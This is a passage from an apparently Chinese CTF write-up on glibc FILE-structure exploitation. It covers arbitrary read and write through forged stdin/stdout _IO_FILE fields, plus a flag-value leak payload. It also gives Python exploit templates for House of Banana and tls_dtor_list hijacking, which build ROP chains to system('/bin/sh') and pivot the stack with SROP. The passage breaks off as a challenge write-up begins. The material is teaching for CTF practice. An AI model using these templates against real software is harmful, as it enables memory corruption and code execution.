n</code>（即<code>_IO_read_end</code>指向实际读入的最后一个字节的数据），之后再将输入缓冲区中的数据拷贝到目标地址。<br>这里需要注意的是，若输入缓冲区中没有剩余的数据，则每次读入数据进输入缓冲区，仅和<code>_IO_buf_base</code>与<code>_IO_buf_end</code>有关。<br>在将数据从输入缓冲区拷贝到目标地址的过程中，<strong>需要满足所调用的读入函数的自身的限制条件</strong>，例如：使用<code>scanf(&quot;%d&quot;,&amp;a)</code>读入整数，则当在输入缓冲区中遇到了字符（或<code>scanf</code>的一些截断符）等不符合的情况，就会停止这个拷贝的过程。最终，<code>_IO_read_ptr</code>指向成功拷贝到目的地址中的最后一个字节数据在输入缓冲区中的地址。因此，若是遇到了不符合限制条件的情况而终止拷贝，则最终会使得<code>_IO_read_end &gt; _IO_read_ptr</code>，即再下一次读入之前会被认定为输入缓冲区中仍有剩余数据，在此情况下，<strong>很有可能不会进行此次读入</strong>，或将输入缓冲区中剩余的数据拷贝到此次读入的目标地址，从而<strong>导致读入的错误</strong>。<br><code>getchar()</code>和<code>IO_getc()</code>的作用是刷新<code>_IO_read_ptr</code>，每次调用，会从输入缓冲区读一个字节数据，即将<code>_IO_read_ptr++</code>。</p><h3 id="相关源码"><a class="header-anchor" href="#相关源码">¶</a><strong>相关源码</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t _IO_file_xsgetn (_IO_FILE *fp, <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br> ...<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ...<br>      <span class="hljs-comment">//输入缓冲区为空则初始化输入缓冲区</span><br>    &#125;<br>  <span class="hljs-keyword">while</span> (want &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;<br>      <span class="hljs-keyword">if</span> (have &gt; <span class="hljs-number">0</span>)<br>        &#123;<br>          ...<br>          <span class="hljs-comment">//memcpy</span><br> <br>        &#125;<br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>          &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)  <span class="hljs-comment">// 调用__underflow读入数据</span><br>          ...<br>        &#125;<br>      ...<br>  <span class="hljs-keyword">return</span> n - want;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> _IO_new_file_underflow (_IO_FILE *fp)<br>&#123;<br>  _IO_ssize_t count;<br>  ...<br>  <span class="hljs-comment">// 会检查_flags是否包含_IO_NO_READS标志，包含则直接返回。</span><br>  <span class="hljs-comment">// 标志的定义是#define _IO_NO_READS 4，因此_flags不能包含4。</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-comment">// 如果输入缓冲区里存在数据，则直接返回</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>  ...<br>  <span class="hljs-comment">// 调用_IO_SYSREAD函数最终执行系统调用读取数据</span><br>  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,<br>               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<br>  ...<br>&#125;<br>libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)<br></code></pre></td></tr></table></figure><p>综上，<strong>stdin</strong> 为了做到<strong>任意写</strong>，满足如下条件，即可进行利用：<br>(1) 设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>（使得输入缓冲区内没有剩余数据，从而可以从用户读入数据）。<br>(2) 设置<code>_flag &amp;~ _IO_NO_READS</code>即<code>_flag &amp;~ 0x4</code>（一般不用特意设置）。<br>(3) 设置<code>_fileno</code>为<code>0</code>（一般不用特意设置）。<br>(4) 设置<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_buf_end</code>为<code>write_end</code>（我们目标写的起始地址是<code>write_start</code>，写结束地址为<code>write_end</code>），且使得<code>_IO_buf_end-_IO_buf_base</code>大于要写入的数据长度。</p><h2 id="stdout-任意读写"><a class="header-anchor" href="#stdout-任意读写">¶</a>stdout 任意读写</h2><p><strong>注意</strong>：<code>printf</code>，<code>fwrite</code>，<code>puts</code>等输出走<code>IO</code>指针（<code>write</code>不走）。<br>在<code>_IO_2_1_stdout_</code>中，<code>_IO_buf_base</code>和<code>_IO_buf_end</code>为输出缓冲区起始位置（默认大小为<code>0x400</code>），在输出的过程中，会先将需要输出的数据从目标地址拷贝到输出缓冲区，再从输出缓冲区输出给用户。<br>缓冲区建立函数<code>_IO_doallocbuf</code>会建立输出缓冲区，并把基地址保存在<code>_IO_buf_base</code>中，结束地址保存在<code>_IO_buf_end</code>中。在建立里输出缓冲区后，会将基址址给<code>_IO_write_base</code>，若是设置的是全缓冲模式<code>_IO_FULL_BUF</code>，则会将结束地址给<code>_IO_write_end</code>，若是设置的是行缓冲模式<code>_IO_LINE_BUF</code>，则<code>_IO_write_end</code>中存的是<code>_IO_buf_base</code>，此外，<code>_IO_write_ptr</code>表示输出缓冲区中已经使用到的地址。即<code>_IO_write_base</code>到<code>_IO_write_ptr</code>之间的空间是已经使用的缓冲区，<code>_IO_write_ptr</code>到<code>_IO_write_end</code>之间为剩余的输出缓冲区。<br>最终实际调用了<code>_IO_2_1_stdout_</code>的<code>vtable</code>中的<code>_xsputn</code>，也就是<code>_IO_new_file_xsputn</code>函数，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c">IO_size_t _IO_new_file_xsputn (_IO_FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) data;<br>  _IO_size_t to_do = n;<br>  <span class="hljs-type">int</span> must_flush = <span class="hljs-number">0</span>;<br>  _IO_size_t count = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123; <span class="hljs-comment">//如果是行缓冲模式...</span><br>      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr; <span class="hljs-comment">//判断输出缓冲区还有多少空间</span><br>      <span class="hljs-keyword">if</span> (count &gt;= n)<br>        &#123;<br>          <span class="hljs-type">const</span> <span class="hljs-type">char</span> *p;<br>          <span class="hljs-keyword">for</span> (p = s + n; p &gt; s; )<br>            &#123;<br>              <span class="hljs-keyword">if</span> (*--p == <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment">//最后一个换行符\n为截断符，且需要刷新输出缓冲区</span><br>                &#123;<br>                  count = p - s + <span class="hljs-number">1</span>;<br>                  must_flush = <span class="hljs-number">1</span>; <span class="hljs-comment">//标志为真：需要刷新输出缓冲区</span><br>                  <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr) <span class="hljs-comment">//判断输出缓冲区还有多少空间（全缓冲模式）</span><br>    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;<br>  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">//如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区</span><br>      <span class="hljs-keyword">if</span> (count &gt; to_do)<br>    count = to_do;<br>      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);<br>      s += count;<br>      to_do -= count;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (to_do + must_flush &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">//此处关键，见下文详细讨论</span><br>    &#123;<br>      _IO_size_t block_size, do_write;<br>      <span class="hljs-keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF) <span class="hljs-comment">//调用_IO_OVERFLOW</span><br>        <span class="hljs-keyword">return</span> to_do == <span class="hljs-number">0</span> ? EOF : n - to_do;<br>      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;<br>      do_write = to_do - (block_size &gt;= <span class="hljs-number">128</span> ? to_do % block_size : <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> (do_write)<br>        &#123;<br>          count = new_do_write (f, s, do_write);<br>          to_do -= count;<br>          <span class="hljs-keyword">if</span> (count &lt; do_write)<br>            <span class="hljs-keyword">return</span> n - to_do;<br>        &#125;<br>      <span class="hljs-keyword">if</span> (to_do)<br>        to_do -= _IO_default_xsputn (f, s+do_write, to_do);<br>    &#125;<br>  <span class="hljs-keyword">return</span> n - to_do;<br>&#125;<br>libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)<br></code></pre></td></tr></table></figure><h3 id="任意写"><a class="header-anchor" href="#任意写">¶</a><strong>任意写</strong></h3><p>可以看到，在行缓冲模式下，判断输出缓冲区还有多少空间，用的是<code>count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr</code>，而在全缓冲模式下，用的是<code>count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr</code>，若是还有空间剩余，则会将要输出的数据复制到输出缓冲区中（此时由<code>_IO_write_ptr</code>控制，向<code>_IO_write_ptr</code>拷贝<code>count</code>长度的数据），因此可通过这一点来实现任意地址写的功能。<br><strong>利用方式</strong>：以全缓冲模式为例，只需将<code>_IO_write_ptr</code>指向<code>write_start</code>，<code>_IO_write_end</code>指向<code>write_end</code>即可。<br>这里需要注意的是，有宏定义<code>#define _IO_LINE_BUF 0x0200</code>，此处<code>flag &amp; _IO_LINE_BUF</code>为真，则表示<code>flag</code>中包含了<code>_IO_LINE_BUF</code>标识，即开启了行缓冲模式（可用<code>setvbuf(stdout,0,_IOLBF,1024)</code>开启），若要构造<code>flag</code>包含<code>_IO_LINE_BUF</code>标识，则<code>flag |= 0x200</code>即可。</p><h3 id="任意读"><a class="header-anchor" href="#任意读">¶</a><strong>任意读</strong></h3><p>先讨论<code>_IO_new_file_xsputn</code>源代码中<code>if (to_do + must_flush &gt; 0)</code>有哪些情况会执行该分支中的内容：<br><strong>(a)</strong> 首先要明确的是<code>to_do</code>一定是非负数，因此若<code>must_flush</code>为<code>1</code>的时候就会执行该分支中的内容，而再往上看，当需要输出的内容中有<code>\n</code>换行符的时候就会需要刷新输出缓冲区，即将<code>must_flush</code>设为<code>1</code>，故当输出内容中有<code>\n</code>的时候就会执行该分支的内容，如用<code>puts</code>函数输出就一定会执行。<br><strong>(b)</strong> 若<code>to_do</code>大于<code>0</code>，也会执行该分支中的内容，因此，当 输出缓冲区未建立 或者 输出缓冲区没有剩余空间 或者 输出缓冲区剩余的空间不够一次性将目标地址中的数据完全拷贝过来 的时候，也会执行该<code>if</code>分支中的内容。<br>而该<code>if</code>分支中主要调用了<code>_IO_OVERFLOW()</code>来刷新输出缓冲区，而在此过程中会调用<code>_IO_do_write()</code>输出我们想要的数据。</p><p>相关源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> _IO_new_file_overflow (_IO_FILE *f, <span class="hljs-type">int</span> ch)<br>&#123;<br>  <span class="hljs-comment">// 判断标志位是否包含_IO_NO_WRITES =&gt; _flags需要不包含_IO_NO_WRITES</span><br>  <span class="hljs-keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)<br>    &#123;<br>      f-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-comment">// 判断输出缓冲区是否为空 以及 是否不包含_IO_CURRENTLY_PUTTING标志位</span><br>  <span class="hljs-comment">// 为了不执行该if分支以免出错，最好定义 _flags 包含 _IO_CURRENTLY_PUTTING</span><br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="hljs-number">0</span> || f-&gt;_IO_write_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ...<br>    &#125;<br>  <span class="hljs-comment">// 调用_IO_do_write 输出 输出缓冲区</span><br>  <span class="hljs-comment">// 从_IO_write_base开始，输出(_IO_write_ptr - f-&gt;_IO_write_base)个字节的数据</span><br>  <span class="hljs-keyword">if</span> (ch == EOF)<br>    <span class="hljs-keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<br>             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) ch;<br>&#125;<br>libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> _IO_size_t <span class="hljs-title function_">new_do_write</span> <span class="hljs-params">(_IO_FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *data, _IO_size_t to_do)</span><br>&#123;<br>  ...<br>  _IO_size_t count;<br>  <span class="hljs-comment">// 为了不执行else if分支中的内容以产生错误，可构造_flags包含_IO_IS_APPENDING 或 设置_IO_read_end等于_IO_write_base</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)<br>    fp-&gt;_offset = _IO_pos_BAD;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)<br>    &#123;<br>      _IO_off64_t new_pos<br>    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> (new_pos == _IO_pos_BAD)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      fp-&gt;_offset = new_pos;<br>    &#125;<br>  <span class="hljs-comment">// 调用函数输出输出缓冲区</span><br>  count = _IO_SYSWRITE (fp, data, to_do);<br>  ...<br>  <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><p>综上，为了做到<strong>任意读</strong>，满足如下条件，即可进行利用：<br>(1) 设置<code>_flag &amp;~ _IO_NO_WRITES</code>，即<code>_flag &amp;~ 0x8</code>；<br>(2) 设置<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>，即<code>_flag | 0x800</code>；<br>(3) 设置<code>_fileno</code>为<code>1</code>；<br>(4) 设置<code>_IO_write_base</code>指向想要泄露的地方，<code>_IO_write_ptr</code>指向泄露结束的地址；<br>(5) 设置<code>_IO_read_end</code>等于<code>_IO_write_base</code> 或 设置<code>_flag &amp; _IO_IS_APPENDING</code>即，<code>_flag | 0x1000</code>。<br>此外，有一个大前提：需要调用<code>_IO_OVERFLOW()</code>才行，因此需使得需要输出的内容中含有<code>\n</code>换行符 或 设置<code>_IO_write_end</code>等于<code>_IO_write_ptr</code>（输出缓冲区无剩余空间）等。<br>一般来说，经常利用<code>puts</code>函数加上述<code>stdout</code>任意读的方式泄露<code>libc</code>。<br><code>_flag</code>的构造需满足的条件:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_flags = <span class="hljs-number">0xfbad0000</span> <br>_flags &amp; = ~_IO_NO_WRITES <span class="hljs-comment">// _flags = 0xfbad0000</span><br>_flags | = _IO_CURRENTLY_PUTTING <span class="hljs-comment">// _flags = 0xfbad0800</span><br>_flags | = _IO_IS_APPENDING <span class="hljs-comment">// _flags = 0xfbad1800</span><br></code></pre></td></tr></table></figure><p>因此，例如在<code>libc-2.27</code>下，构造<code>payload = p64(0xfbad1800) + p64(0)*3 + b'\x58'</code>，泄露出的第一个地址即为<code>_IO_file_jumps</code>的地址。<br>此外，<code>_flags</code>也可再加一些其他无关紧要的部分，如设置为<code>0xfbad1887</code>，<code>0xfbad1880</code>，<code>0xfbad3887</code>等等。</p><h1>[番外篇]Exit 艺术鉴赏</h1><p>👴 不想开新的文章，何况 exit 和 IO 在某些场合联系比较紧。</p><p>下面所有利用手法的条件相对统一。</p><ol><li>能从主函数返回或进入 exit</li><li>一次 Largebin Attack 或任意写（libc 地址和 heap 地址要有）</li></ol><h2 id="Hosue-of-Banana"><a class="header-anchor" href="#Hosue-of-Banana">¶</a>Hosue of Banana</h2><p>这玩意单谈利用不难，结构体 👴 说实话看的似懂非懂，但是 👴 一调试就知道哪里可以打骚操作，只要劫持掉相关指针就好了。调试没写就是还在咕。</p><p>拿下面模板的话记得自己改改，不然咱wp撞了蛮尴尬 = =</p><h3 id="思路-v4"><a class="header-anchor" href="#思路-v4">¶</a>思路</h3><p>就算你现在没时间去调试，拿下面的模板，按这个步骤就能完成栈迁移：</p><ol><li>Largebin Attack 打 <code>_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next</code>。</li><li>下面的 link_4_addr 改成 Largebin(Chunk2) 的 <strong>chunk头</strong> 地址</li><li>利用 Chunk1 在 Chunk2 的 prev_data 位置写上 p64(link_4_addr + 0x20)</li><li>走 exit 触发 SROP 完成栈迁移，或者改掉下面标注的 RIP ，走自己的奇奇怪怪</li></ol><h3 id="SROP-栈迁移"><a class="header-anchor" href="#SROP-栈迁移">¶</a>SROP 栈迁移</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">rop_chain = flat(pop_rdi_ret,bin_sh,ret,system_addr)<br>link_4_addr = heap_base + <span class="hljs-number">0xcd0</span><br>fake_link_map = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(link_4_addr)<br>fake_link_map += p64(magic) + p64(ret)<span class="hljs-comment"># magic = setcontext+61</span><br>fake_link_map += p64(<span class="hljs-number">0</span>)<br>fake_link_map += rop_chain<br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0xc8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_link_map += p64(link_4_addr + <span class="hljs-number">0x28</span> + <span class="hljs-number">0x18</span>) <span class="hljs-comment"># RSP</span><br>fake_link_map += p64(pop_rdi_ret)   <span class="hljs-comment"># RCX RIP</span><br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_link_map += p64(link_4_addr + <span class="hljs-number">0x10</span> + <span class="hljs-number">0x110</span>)*<span class="hljs-number">0x3</span><br>fake_link_map += p64(<span class="hljs-number">0x10</span>)  <br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x31C</span> - <span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_link_map += p8(<span class="hljs-number">0x8</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x520</span>+p64(link_4_addr + <span class="hljs-number">0x20</span>))<br>edit(<span class="hljs-number">2</span>,fake_link_map)<br></code></pre></td></tr></table></figure><h2 id="tls-dtor-list"><a class="header-anchor" href="#tls-dtor-list">¶</a>tls_dtor_list</h2><p>👴 也知道这玩意也不是 IO，但也扔这。</p><h3 id="条件"><a class="header-anchor" href="#条件">¶</a>条件</h3><ol><li>能从主函数返回或进入 exit</li><li>俩次 Largebin Attack 或任意写（libc 地址和 heap 地址要有），一次写 fskey，一次写 tls_dtor_list 指针</li></ol><h3 id="源码"><a class="header-anchor" href="#源码">¶</a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// glibc-2.35/stdlib/cxa_thread_atexit_impl.c</span><br><span class="hljs-comment">/* Call the destructors.  This is called either when a thread returns from the</span><br><span class="hljs-comment">   initial function or when the process exits via the exit function.  */</span><br><span class="hljs-type">void</span><br>__call_tls_dtors (<span class="hljs-type">void</span>)<br>&#123;<br>  <span class="hljs-keyword">while</span> (tls_dtor_list)<br>    &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dtor_list</span> *<span class="hljs-title">cur</span> =</span> tls_dtor_list;<br>      dtor_func func = cur-&gt;func;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>      PTR_DEMANGLE (func);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      tls_dtor_list = tls_dtor_list-&gt;next;<br>      func (cur-&gt;obj);<br><br>      <span class="hljs-comment">/* Ensure that the MAP dereference happens before</span><br><span class="hljs-comment"> l_tls_dtor_count decrement.  That way, we protect this access from a</span><br><span class="hljs-comment"> potential DSO unload in _dl_close_worker, which happens when</span><br><span class="hljs-comment"> l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span><br>      atomic_fetch_add_release (&amp;cur-&gt;<span class="hljs-built_in">map</span>-&gt;l_tls_dtor_count, <span class="hljs-number">-1</span>);<br>      <span class="hljs-built_in">free</span> (cur);<br>    &#125;<br>&#125;<br>libc_hidden_def (__call_tls_dtors)<br></code></pre></td></tr></table></figure><h3 id="调试-v4"><a class="header-anchor" href="#调试-v4">¶</a>调试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; b __call_tls_dtors<br>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x7ffff7dd1d60</span>: file ./stdlib/cxa_thread_atexit_impl.c, line <span class="hljs-number">149.</span><br></code></pre></td></tr></table></figure><p>一次打 fskey，通过 canary 或者 fsbase 寻址。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721205843557.png" alt="image-20220721205843557"></p><p>一次打 tls_dtor_list。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721205926990.png" alt="image-20220721205926990"></p><p>在流程中会从 Largebin 的 prev_data 位置拿 rax ，bk 位置拿 rdx。（size位置拿 rdi）</p><p>考虑：</p><ol><li>简单的通过前一堆块写 prev_data，Largebin 写 bk，利用 setcontext + 61 走 SROP</li><li>恢复 Largebin，申请出不同 size 的，写 system 和 <code>/bin/sh</code> 分别在俩位置 getshell</li></ol><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721210027171.png" alt="image-20220721210027171"></p><p>完成控制流劫持。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721210316505.png" alt="image-20220721210316505"></p><h3 id="SROP-栈迁移-v2"><a class="header-anchor" href="#SROP-栈迁移-v2">¶</a>SROP 栈迁移</h3><p>布局：</p><ol><li>Chunk1 是用来覆写 Chunk2 的 prev_data 部分</li><li>Chunk2 是用来 Largebin Attack 的 Largebin</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x520</span>+p64(rol(magic^(fskey),<span class="hljs-number">0x11</span>,<span class="hljs-number">64</span>)))<br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">1</span>+p64(heap_base+<span class="hljs-number">0xcd0</span>))<br></code></pre></td></tr></table></figure><h1>经典例题鉴赏</h1><h2 id="Dest0g3-heap"><a class="header-anchor" href="#Dest0g3-heap">¶</a>Dest0g3_heap</h2><p>这题 👴 肯定做麻烦了，但是 👴 打的很爽。</p><p>出自 BUUCTF 的 <a href="https://buuoj.cn/match/matches/109/challenges#ez_kiwi">Dest0g3 520迎新赛</a>。这题如果放到 2.34 且开沙箱，将是绝杀，👴 便愿称之为 <strong>IO 专项训练</strong>。可惜放不得。</p><p>但是 👴 这里还是自己分别假装打一下没有开了沙箱的情形和没有 <strong>hook</strong> 开了沙箱的情形，问就是 👴 不想自己整 demo 了。</p><h3 id="分析-v4"><a class="header-anchor" href="#分析-v4">¶</a>分析</h3><p>程序比较有意思，mmap 了一块空间，在其上我们可以任意 edit 和 free 。但是给我们的 add 是 calloc 一个堆块，对我们影响很大。 然后给的 show 也是 show 咱 calloc 的堆块，所以有点阴间。</p><h4 id="Init"><a class="header-anchor" href="#Init">¶</a>Init</h4><p><strong>setvbuf</strong> 👴 也见得多了，这 ✔️ 8️⃣ 玩意用在 stdin 和 stdout 特别合适，可以解决远端交互的问题。但是它会把指针放到 bss 段上，用在 <strong>stderr</strong> 会让 👴 🐑 <strong>Emma</strong> 的难度增加。这函数就是 mmap 